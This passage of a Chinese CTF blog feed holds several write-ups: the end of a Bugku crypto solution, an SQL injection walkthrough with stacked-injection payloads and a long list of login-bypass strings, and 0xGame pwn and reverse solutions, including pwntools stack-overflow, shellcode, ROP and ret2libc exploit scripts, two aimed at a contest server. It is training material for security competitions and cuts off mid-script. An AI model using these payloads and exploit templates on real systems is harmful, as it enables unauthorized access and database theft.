class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            t<span class="token operator">=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span>            t1<span class="token operator">=</span>t1<span class="token operator">+</span>t<span class="token keyword">print</span> t1            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://shierjinghuang.github.io/2021/10/16/bugku%E9%9D%B6%E5%9C%BA%E4%B9%8Bcrypto-%E4%BA%8C/7.png"></p><p>借助<del><strong>WPS</strong></del>的替换功能将空格去掉，得到</p><blockquote><p>57656c636f6d6520746f206b656c61696265692e204769766520796f75206120666c6167206173206120676966742e2020666c61677b31653462663831613633393464653561626330303561633665333961333837627d202e2048617665206120676f6f642074696d657e</p></blockquote><p>最后使用在线的16进制转字符串工具得到flag。</p><blockquote><p>Welcome to kelaibei. Give you a flag as a gift.  flag{1e4bf81a6394de5abc005ac6e39a387b} . Have a good time~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯-2019随便注wp</title>
      <link href="/2021/10/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8wp/"/>
      <url>/2021/10/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8wp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写文不保存，误关两行泪,写博客或者其他的什么东西，得记得一定要保存啊</p></blockquote><hr><h1>强网杯-2019随便注wp</h1>~~解题记录~~(出错记录)<p><img src="https://shierjinghuang.github.io/2021/10/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8wp/1.png" alt="1"></p><p>随便注，第一步当然是注入了，注入一个万能密码尝试一下，<code>1&#39; or 1=1 #</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"1"</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"hahahah"</span><span class="token punctuation">&#125;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"2"</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"miaomiaomiao"</span><span class="token punctuation">&#125;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"114514"</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"ys"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在sql注入，进一步实验<code>order</code>方法使用<code>1&#39; order by 1 #</code>注入，当数值为3时，不再有回显，说明字段数为2。</p><p>测试union注入，<code>1&#39; union select 1,2#</code>出现报错信息。</p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/select|update|delete|drop|insert|where|\./i"</span><span class="token punctuation">,</span><span class="token variable">$inject</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>union 被过滤掉了，无法使用union方法进行解题。</p><p>这个时候尝试使用 堆叠注入 ，通过<code>;</code>号注入多条语句。注入<code>0&#39;; show databases; #</code>得到数据库。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"ctftraining"</span><span class="token punctuation">&#125;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"information_schema"</span><span class="token punctuation">&#125;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"mysql"</span><span class="token punctuation">&#125;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"performance_schema"</span><span class="token punctuation">&#125;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"supersqli"</span><span class="token punctuation">&#125;</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有得到需要的信息，尝试使用<code>0&#39;; show tables; #</code>希望能够爆出表单，</p><p><img src="https://shierjinghuang.github.io/2021/10/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8wp/2.png" alt="2"></p><p>从结果看得到了两个表单，分别使用show语句查看两个表单，结果能够发现早<code>1919810931114514</code>这一个表单中应该存在<code>flag</code>但是单纯通过show语句无法得到。</p><blockquote><p>1’; show columns from words; #</p></blockquote><blockquote><p>0’; show columns from <code>1919810931114514</code>; #</p></blockquote><p><img src="https://shierjinghuang.github.io/2021/10/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8wp/3.png" alt="3"></p><p>最后通过handler方法进行注入，关于handler方法我找了一篇博客。[MySQL 之 handler 的详细使用及说明][<a href="https://blog.csdn.net/qq_43427482/article/details/109898934?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163426958816780264046054%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163426958816780264046054&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-109898934.first_rank_v2_pc_rank_v29&amp;utm_term=1%27;+handler+%601919810931114514%60+open+as+%60a%60;+handler+%60a%60+read+next;%23&amp;spm=1018.2226.3001.4187%5D">https://blog.csdn.net/qq_43427482/article/details/109898934?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163426958816780264046054%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163426958816780264046054&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-109898934.first_rank_v2_pc_rank_v29&amp;utm_term=1%27%3B+handler+%601919810931114514%60+open+as+%60a%60%3B+handler+%60a%60+read+next%3B%23&amp;spm=1018.2226.3001.4187]</a></p><p><code>1&#39;; handler </code>1919810931114514<code>open as</code>a<code>; handler </code>a<code> read next;#</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"flag&#123;9140137b-1dd6-423a-a77a-24805868b0d6&#125;"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>相关知识</strong></p><ol><li><p>万能密码</p><p>所谓万能密码就是通过构造形如1=1，a=a的恒等式又由于,在SQL语句中**#**是注释符，所以后面的语句都会被注释掉，会将#后面的语句全部注释掉。</p><pre class="line-numbers language-none"><code class="language-none">&quot;or &quot;a&quot;&#x3D;&quot;a&#39;.).or.(&#39;.a.&#39;&#x3D;&#39;.a or 1&#x3D;1--&#39;or 1&#x3D;1--a&#39;or&#39; 1&#x3D;1--&quot;or 1&#x3D;1--&#39;or.&#39;a.&#39;&#x3D;&#39;a&quot;or&quot;&#x3D;&quot;a&#39;&#x3D;&#39;a&#39;or&#39;&#39;&#x3D;&#39;&#39;or&#39;&#x3D;&#39;or&#39;admin&#39;or 1&#x3D;1#admin&#39;&#x2F;*aaaa*&#x2F;&#39;&#39;or 1&#x3D;1&#x2F;*&quot;or &quot;a&quot;&#x3D;&quot;a&quot;or 1&#x3D;1--&quot;or&quot;&#x3D;&quot;&quot;or&quot;&#x3D;&quot;a&#39;&#x3D;&#39;a&quot;or1&#x3D;1--&quot;or&#x3D;or&quot;&#39;&#39;or&#39;&#x3D;&#39;or&#39;&#39;) or (&#39;a&#39;&#x3D;&#39;a&#39;.).or.(&#39;.a.&#39;&#x3D;&#39;.a&#39;or 1&#x3D;1&#39;or 1&#x3D;1--&#39;or 1&#x3D;1&#x2F;*&#39;or&quot;&#x3D;&quot;a&#39;&#x3D;&#39;a&#39;or&#39; &#39;1&#39;&#x3D;&#39;1&#39;&#39;or&#39;&#39;&#x3D;&#39;&#39;or&#39;&#39;&#x3D;&#39;&#39;or&#39;&#39;&#x3D;&#39;&#39;or&#39;&#x3D;&#39;1&#39;&#39;or&#39;&#x3D;&#39;or&#39;&#39;or.&#39;a.&#39;&#x3D;&#39;a&#39;or1&#x3D;1--1&#39;or&#39;1&#39;&#x3D;&#39;1a&#39;or&#39; 1&#x3D;1--a&#39;or&#39;1&#x3D;1--or &#39;a&#39;&#x3D;&#39;a&#39;or 1&#x3D;1--or1&#x3D;1--&quot;or &quot;a&quot;&#x3D;&quot;a &#39;)or(&#39;a&#39;&#x3D;&#39;aor 1&#x3D;1–&#39;or 1&#x3D;1–a&#39;or&#39; 1&#x3D;1–&quot;or 1&#x3D;1–&#39;or&#39;a&#39;&#x3D;&#39;a&quot;or&quot;&#x3D;&quot;a&#39;&#x3D;&#39;a&#39;or&quot;&#x3D;&#39;&#39;or&#39;&#x3D;&#39;or&#39;1 or &#39;1&#39;&#x3D;&#39;1&#39;&#x3D;11 or &#39;1&#39;&#x3D;&#39;1′ or 1&#x3D;1&#39;OR 1&#x3D;1%00&quot;or 1&#x3D;1%00&#39;xoradmin&#39; or &#39;a&#39;&#x3D;&#39;a&#39;or 1&#x3D;1&#x2F;*something&#39;OR &#39;1&#39;&#x3D;&#39;11&#39;or&#39;1&#39;&#x3D;&#39;admin&#39; OR 1&#x3D;1&#x2F;*&#39; or 1&#x3D;1#&#39;&#x3D;0#&#39;&gt;-1#&#39;&lt;1#1&#39;&lt;99#&#39;&#x3D;0&#x3D;1#&#39;&lt;&#x3D;&gt;0#&#39;&#x3D;0&#x3D;1&#x3D;1&#x3D;1&#x3D;1&#x3D;1#&#39;&#x3D;1&lt;&gt;1#&#39;&lt;&gt;1#1&#39;&lt;&gt;99999#&#39;!&#x3D;2!&#x3D;3!&#x3D;4#&#39;|0#&#39;&amp;0#&#39;^0#&#39;&lt;&lt;0#&#39;&gt;&gt;0#&#39;&amp;&#39;&#39;#&#39;%11&amp;1#&#39;&amp;1&amp;1#&#39;|0&amp;1#&#39;&lt;&lt;0|0#&#39;&lt;&lt;0&gt;&gt;0#&#39;*9#&#39;&#x2F;9#&#39;%9#&#39;+0#&#39;-0#&#39;+2+5-7#&#39;+0+0-0#&#39;-0-0-0-0-0#&#39;*9*8*7*6*5#&#39;&#x2F;2&#x2F;3&#x2F;4#&#39;%12%34%56%78#&#39;&#x2F;**&#x2F;+&#x2F;**&#x2F;0#&#39;-----0#&#39;+++0+++++0*0#&#39;&lt;hex(1)#&#39;&#x3D;left(0x30,1)#&#39;&#x3D;right(0,1)#&#39;!&#x3D;curdate()#&#39;-reverse(0)#&#39;&#x3D;ltrim(0)#&#39;&lt;abs(1)#&#39;*round(1,1)#&#39;&amp;left(0,0)#&#39;*round(0,1)*round(0,1)#&#39;&#x3D;upper     (0)#&#39; &lt;1 and 1#&#39;xor 1#&#39;div 1#&#39;is not null#admin&#39; order by&#39;admin&#39; group by&#39;&#39;like 0#&#39;between 1 and 1#&#39;regexp 1#&#39;&#x3D;&#39;&#39;&lt;&gt;&#39;1&#39;&gt;1&#x3D;&#39;0&#39;&#x3D;&#39;0&#39;&lt;1 and 1&gt;&#39;&#39;&lt;&gt;ifnull(1,2)&#x3D;&#39;1&#39;&#x3D;round(0,1)&#x3D;&#39;1&#39;*0*&#39;&#39;+&#39;&#39;-&#39;&#39;+1-1-&#39;&#39;+(0-0)#&#39;&#x3D;0&lt;&gt;((reverse(1))-(reverse(1)))#&#39;&lt;(8*7)*(6*5)*(4*3)#&#39;&amp;(1+1)-2#&#39;&gt;(0-100)#&#39; or 1&#x3D;1#&#39; or &#39;&#39; || &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在过滤了 select 和 where 的情况下，还可以使用 show 来爆出数据库名，表名，和列名。</p></li></ol><blockquote><p>show datebases; //数据库。<br>show tables; //表名。<br>show columns from table; //字段。</p></blockquote><blockquote><p>alert作用：修改已知表的列。（ 添加：add | 修改：alert，change | 撤销：drop ）</p><p>alter table “ table_name” add “ column_name”  type;</p><p>删除一个列<br>alter table “ table_name” drop “ column_name”  type;<br>改变列的数据类型<br>alter table “ table_name” alter column “ column_name” type;<br>改列名<br>alter table “ table_name” change “ column1” “ column2” type;<br>alter table “table_name” rename “column1” to “column2”;</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nctf迎新赛第一周</title>
      <link href="/2021/10/11/Nctf%E8%BF%8E%E6%96%B0%E8%B5%9B%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
      <url>/2021/10/11/Nctf%E8%BF%8E%E6%96%B0%E8%B5%9B%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0xGame-2021-WriteUp-1（转载）"><a href="#0xGame-2021-WriteUp-1（转载）" class="headerlink" title="0xGame 2021 WriteUp 1（转载）"></a>0xGame 2021 WriteUp 1（转载）</h1><p>[toc]</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Pwn？！"><a href="#Pwn？！" class="headerlink" title="Pwn？！"></a>Pwn？！</h3><p>附件给的其实有点多余，我给的目的是让大家知道pwn的最终目的就是执行system(“/bin/sh”)</p><p>直接nc连接上之后cat flag打开flag文件即可</p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>我已经给了后门函数地址在0x40115b</p><p>有一个明显的栈溢出</p><p>ida里面显示距离rbp-0x50</p><p>那么就直接覆盖0x50个字节填充以及0x8个字节覆盖rbp即可劫持到ret地址</p><p>直接覆盖成后门函数即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'121.4.15.155'</span><span class="token punctuation">,</span><span class="token number">10003</span><span class="token punctuation">)</span><span class="token comment">#r=process('./main')</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40115b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WTF？Shellcode！"><a href="#WTF？Shellcode！" class="headerlink" title="WTF？Shellcode！"></a>WTF？Shellcode！</h3><p>这个题其实就是想让大家了解什么是shellcode</p><p>也就是直接执行机器码</p><p>通过上网查找或者让pwntools自己生成的方法找到一段shellcode即可</p><p>注意shellcode的编写需要熟练的汇编理解，而且日后会经常写一些复杂的shellcode</p><p>注意到执行的是buf+0x20而不是buf本身</p><p>所以填充0x20个字节再放置shellcode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>shellcode<span class="token operator">=</span><span class="token string">"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="No-BackDoor"><a href="#No-BackDoor" class="headerlink" title="No BackDoor!"></a>No BackDoor!</h3><p>这题需要了解linux下寄存器传递参数的顺序</p><p>rdi rsi rdx rcx r8 r9 栈</p><p>既然存在system函数，而且查找存在/bin/sh字符串</p><p>直接控制rdi位/bin/sh字符串地址，在调用system函数</p><p>就相当于执行了system(“/bin/sh”)</p><p>而控制rdi用的是pop rdi ; ret ;</p><p>这样直接把字符串地址布置在栈上</p><p>通过pop即控制了rdi参数</p><p>(注意到这里有点小问题，就是直接执行会报错，详情可以参考<a href="http://blog.eonew.cn/archives/958">http://blog.eonew.cn/archives/958</a></p><p>需要ret一次来调整栈帧)(当然也可以直接当下一题做)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>pop_rdi<span class="token operator">=</span><span class="token number">0x401223</span>bin_sh<span class="token operator">=</span><span class="token number">0x404040</span>system<span class="token operator">=</span><span class="token number">0x401040</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ret2libc-pro-max"><a href="#ret2libc-pro-max" class="headerlink" title="ret2libc pro max"></a>ret2libc pro max</h3><p>模板题，ctfwiki上讲的非常详细</p><p>建议遇上相似题目直接套模板</p><p>libc版本为2.23-ubuntu11.2_amd64</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'121.4.15.155'</span><span class="token punctuation">,</span><span class="token number">10004</span><span class="token punctuation">)</span><span class="token comment">#r=process('./main')</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>pop_rdi<span class="token operator">=</span><span class="token number">0x401223</span>puts_plt<span class="token operator">=</span><span class="token number">0x401030</span>puts_got<span class="token operator">=</span><span class="token number">0x404018</span>start<span class="token operator">=</span><span class="token number">0x401060</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>system<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x18ce17</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Signin-User-Friendly"><a href="#Signin-User-Friendly" class="headerlink" title="Signin: User Friendly"></a>Signin: User Friendly</h3><p>IDA 打开软件 直接按 <code>f5</code> 或者 <code>shift</code> + <code>f12</code> 查看字符串，即可看到flag</p><p>有人可能会想知道，每次生成的随机数是多少。实际上我也不知道。因为每次程序运行使用的随机种子都不同，所以生成的随机数也不同。如果想知道生成的随机数是多少，可以自行动态调试获知，再输入程序获取flag</p><h3 id="Packet"><a href="#Packet" class="headerlink" title="Packet"></a>Packet</h3><p><a href="https://github.com/upx/upx" title="UPX链接">UPX github链接</a></p><p>脱壳命令 <code>upx -d test.exe</code></p><p>这里还需要知道一下 <code>(a&amp;~b | b&amp;~a) == a ^ b</code> 这两个运算相等</p><p>解题脚本</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [161, 15, 188, 111, 218, 169, 159, 94, 41, 246, 197, 228, 110, 242, 177, 56, 27, 1, 17, 256, 256, 50, 233, 65, 104, 2, 4, 6, 42, 112, 55, 107, 48, 93, 130, 232, 37, 87, 242, 130]enc &#x3D; [145, 119, 251, 14, 183, 204, 228, 56, 17, 148, 253,133, 92, 145, 132, 92, 125, 103, 39, 308, 309, 10, 216, 35, 13, 48, 101, 62, 19, 69, 84, 82, 81, 62, 176, 217, 19, 51, 195, 255]for i in range(0,40):    print(chr(arr[i] ^ enc[i]), end &#x3D; &quot;&quot;)# 0xGame&#123;f8b8a2c5dff64581be2a895c9ac216d1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Our-Compilation-Story"><a href="#Our-Compilation-Story" class="headerlink" title="Our Compilation Story"></a>Our Compilation Story</h3><p>简单 python 代码，读懂就可以做</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [21,44,45,104,31,30,26,121,65,125,23,112,77,46,47,126,89,112,7,109,7,88,10,105,104,59,54,91,83,98,32,54,15,65,113,119,113]arr &#x3D; 